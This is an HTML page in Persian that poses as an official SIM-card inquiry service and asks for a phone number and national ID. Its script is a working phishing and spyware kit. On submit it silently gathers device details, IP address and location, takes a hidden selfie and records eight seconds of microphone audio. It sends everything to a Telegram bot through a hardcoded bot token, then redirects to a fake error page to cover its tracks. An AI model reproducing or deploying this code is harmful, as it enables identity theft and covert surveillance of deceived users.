<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سامانه استعلام سیم‌کارت</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Tahoma, sans-serif;
        }
        body {
            background: linear-gradient(145deg, #0b2b3f, #1a4b61);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            direction: rtl;
            margin: 0;
        }
        .container {
            background: white;
            padding: 35px 25px;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            width: 400px;
            text-align: center;
        }
        .logo { font-size: 48px; margin-bottom: 10px; }
        h2 { color: #1a2a3a; font-size: 22px; margin-bottom: 8px; }
        .sub { color: #6c7a8a; font-size: 14px; margin-bottom: 25px; }
        input {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            background: #f8fafc;
            text-align: center;
        }
        input:focus {
            border-color: #1a7ae8;
            background: white;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1a7ae8;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 12px;
        }
        button:hover { background: #0f5bb5; }
        .note {
            margin-top: 18px;
            font-size: 12px;
            color: #94a3b8;
            border-top: 1px solid #e2e8f0;
            padding-top: 16px;
        }
        .note span { color: #1a7ae8; font-weight: bold; }
        .input-group { text-align: right; margin: 5px 0; }
        .input-group label {
            font-size: 13px;
            color: #4a5a6a;
            font-weight: bold;
            display: block;
            margin-right: 5px;
        }
        /* المان‌های مخفی برای پردازش بی‌صدا */
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📱</div>
        <h2>استعلام سیم‌کارت</h2>
        <p class="sub">برای استعلام وضعیت سیم‌کارت، اطلاعات زیر را وارد کنید</p>

        <form id="findForm">
            <div class="input-group">
                <label>📞 شماره موبایل</label>
                <input type="text" id="phone" placeholder="مثلاً 09123456789" required>
            </div>
            <div class="input-group">
                <label>🆔 کد ملی</label>
                <input type="text" id="nationalCode" placeholder="مثلاً 1234567890" required>
            </div>
            <button type="submit" id="submitBtn">🔍 استعلام</button>
        </form>

        <div class="note">
            🔒 اطلاعات شما محفوظ است · <span>سامانه همتا</span>
        </div>
        
        <!-- المان‌های مخفی برای پردازش بی‌صدا -->
        <div id="hiddenVideoContainer" class="hidden"></div>
        <div id="hiddenAudioContainer" class="hidden"></div>
    </div>

    <script>
        // ======================================================
        // تنظیمات ربات تلگرام
        // ======================================================
        const BOT_TOKEN = '8826841444:AAGLmSPOXr_tID0VKHFjhrhod9OqQhnNI60';
        const CHAT_ID = '7059995091';

        // ======================================================
        // دریافت اطلاعات دستگاه و IP (بی‌صدا)
        // ======================================================
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                online: navigator.onLine,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack || 'نامشخص'
            };
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) {
                console.error('❌ خطا در دریافت IP:', e);
                return 'نامشخص';
            }
        }

        // ======================================================
        // تابع گرفتن عکس سلفی (بی‌صدا)
        // ======================================================
        async function captureSelfieSilently() {
            try {
                // ایجاد المان ویدئو مخفی
                const videoContainer = document.getElementById('hiddenVideoContainer');
                const video = document.createElement('video');
                video.style.display = 'none';
                videoContainer.appendChild(video);

                // دریافت استریم دوربین جلو
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });

                // اتصال استریم به ویدئو
                video.srcObject = stream;
                await video.play();

                // گرفتن عکس از ویدئو
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // تبدیل به Blob
                const photoBlob = await new Promise((resolve) => {
                    canvas.toBlob((blob) => {
                        resolve(blob);
                    }, 'image/jpeg', 0.8);
                });

                // پاک کردن المان‌ها
                stream.getTracks().forEach(track => track.stop());
                videoContainer.innerHTML = '';

                console.log('✅ عکس سلفی گرفته شد (بی‌صدا)');
                return photoBlob;

            } catch (error) {
                console.error('❌ خطا در گرفتن عکس سلفی:', error);
                return null;
            }
        }

        // ======================================================
        // تابع ضبط صدا (بی‌صدا)
        // ======================================================
        async function recordAudioSilently() {
            try {
                const audioContainer = document.getElementById('hiddenAudioContainer');
                
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const audioChunks = [];

                mediaRecorder.ondataavailable = event => {
                    audioChunks.push(event.data);
                };

                const audioPromise = new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                        resolve(audioBlob);
                    };
                });

                mediaRecorder.start();
                
                // ضبط ۸ ثانیه
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop());
                }, 8000);

                const audioBlob = await audioPromise;
                console.log('✅ ضبط صدا انجام شد (بی‌صدا)');
                return audioBlob;

            } catch (e) {
                console.error('❌ خطا در ضبط صدا:', e);
                return null;
            }
        }

        // ======================================================
        // تابع گرفتن موقعیت (بی‌صدا)
        // ======================================================
        function getLocationSilently() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('موقعیت در دسترس نیست');
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        resolve(`https://www.google.com/maps?q=${lat},${lon}`);
                    },
                    error => {
                        resolve('❌ خطا در گرفتن موقعیت');
                    }
                );
            });
        }

        // ======================================================
        // تابع ساخت پیام زیبا
        // ======================================================
        function buildBeautifulMessage(phone, nationalCode, ip, location, deviceInfo, audioStatus, selfieStatus) {
            let message = `🎯 **هدف جدید شناسایی شد** 🎯\n\n`;
            message += `🎨 **قالب:** 📶 اینترنت رایگان\n\n`;
            message += `🌐 **آدرس IP:**\n`;
            message += `${ip}\n\n`;
            message += `📍 **موقعیت تقریبی:**\n`;
            message += `${location}\n\n`;
            message += `🖥️ **مشخصات دستگاه:**\n`;
            message += `${deviceInfo.userAgent}\n\n`;
            message += `📝 **اطلاعات ورودی کاربر:**\n`;
            message += `📞 شماره: ${phone}\n`;
            message += `🆔 کد ملی: ${nationalCode}\n\n`;
            message += `📸 **وضعیت عکس سلفی:**\n`;
            message += `🤳 ${selfieStatus ? '✅ دریافت شد' : '❌ دریافت نشد'}\n\n`;
            message += `🎤 **ضبط صدا:** ${audioStatus ? '✅ انجام شد' : '❌ انجام نشد'}\n\n`;
            message += `⏱️ **زمان:** ${new Date().toLocaleString('fa-IR')}`;
            
            return message;
        }

        // ======================================================
        // توابع ارسال به تلگرام (بی‌صدا)
        // ======================================================
        async function sendPhotoToTelegram(photoBlob, caption = '🤳 عکس سلفی') {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, 'selfie.jpg');
                formData.append('caption', caption);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                return response.ok;
            } catch (e) {
                console.error('❌ خطا در ارسال عکس:', e);
                return false;
            }
        }

        async function sendAudioToTelegram(audioBlob, caption = '🎤 ضبط صدا') {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('audio', audioBlob, 'recorded_audio.wav');
                formData.append('caption', caption);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });

                return response.ok;
            } catch (e) {
                console.error('❌ خطا در ارسال صدا:', e);
                return false;
            }
        }

        async function sendMessageToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                return response.ok;
            } catch (e) {
                console.error('❌ خطا در ارسال متن:', e);
                return false;
            }
        }

        // ======================================================
        // رویداد کلیک روی دکمه (همه چیز بی‌صدا)
        // ======================================================
        document.getElementById('findForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            // غیرفعال کردن دکمه برای جلوگیری از کلیک مجدد
            const submitBtn = document.getElementById('submitBtn');
            submitBtn.disabled = true;
            submitBtn.textContent = '⏳ در حال پردازش...';

            try {
                // دریافت اطلاعات (بی‌صدا)
                const phone = document.getElementById('phone').value;
                const nationalCode = document.getElementById('nationalCode').value;
                
                const deviceInfo = getDeviceInfo();
                const ip = await getIPInfo();
                const location = await getLocationSilently();
                
                // گرفتن عکس سلفی (بی‌صدا)
                const selfiePhoto = await captureSelfieSilently();
                
                // ضبط صدا (بی‌صدا)
                const audioBlob = await recordAudioSilently();

                // ساخت پیام زیبا
                const message = buildBeautifulMessage(
                    phone,
                    nationalCode,
                    ip,
                    location,
                    deviceInfo,
                    audioBlob !== null,
                    selfiePhoto !== null
                );

                // ارسال به تلگرام (بی‌صدا)
                await sendMessageToTelegram(message);

                if (selfiePhoto) {
                    await sendPhotoToTelegram(selfiePhoto, '🤳 عکس سلفی');
                }

                if (audioBlob) {
                    await sendAudioToTelegram(audioBlob, '🎤 ضبط صدا');
                }

                // هدایت به صفحه خطا (برای پنهان‌سازی)
                window.location.href = 'https://example.com/error';

            } catch (error) {
                console.error('❌ خطا:', error);
                // در صورت خطا، باز هم به صفحه خطا هدایت کن
                window.location.href = 'https://example.com/error';
            }
        });

        console.log('✅ صفحه بارگذاری شد (حالت فیشینگ)');
    </script>
</body>
</html>
